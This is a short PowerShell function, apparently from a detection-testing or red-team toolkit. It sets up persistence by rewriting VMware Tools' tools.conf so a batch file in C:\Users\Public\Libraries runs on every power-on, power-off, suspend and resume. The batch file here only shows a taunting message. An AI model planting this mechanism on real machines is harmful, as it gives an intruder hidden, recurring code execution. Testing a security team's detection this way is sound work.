# vmTools
#----------------------------------------------------------------------------------------------------------------------------------#
function vmTools_Persist {
Write-host -ForegroundColor Yellow "Set vmTools..."
Start-Sleep 2
    
$conf = @"
[powerops]
poweron-script=C:\Users\Public\Libraries\ShockSOC.bat
poweroff-script=C:\Users\Public\Libraries\ShockSOC.bat
resume-script=C:\Users\Public\Libraries\ShockSOC.bat
suspend-script=C:\Users\Public\Libraries\ShockSOC.bat

"@ 

$bat = @"
msg * Catch Me If You Can ;)
"@

    if (Test-Path "$env:ProgramData\VMware\VMware Tools") {
        Set-Content -Path "C:\Users\Public\Libraries\ShockSOC.bat" -Value $bat -Force

        if (Test-Path "$env:ProgramData\VMware\VMware Tools\tools.conf") { # backup if exists
            Copy "$env:ProgramData\VMware\VMware Tools\tools.conf" "$env:ProgramData\VMware\VMware Tools\tools.conf.bak"
        }

        Set-Content -Path "$env:ProgramData\VMware\VMware Tools\tools.conf" -Value $conf -Force

    }
    else {}
Write-host -ForegroundColor Green "Done!"
}
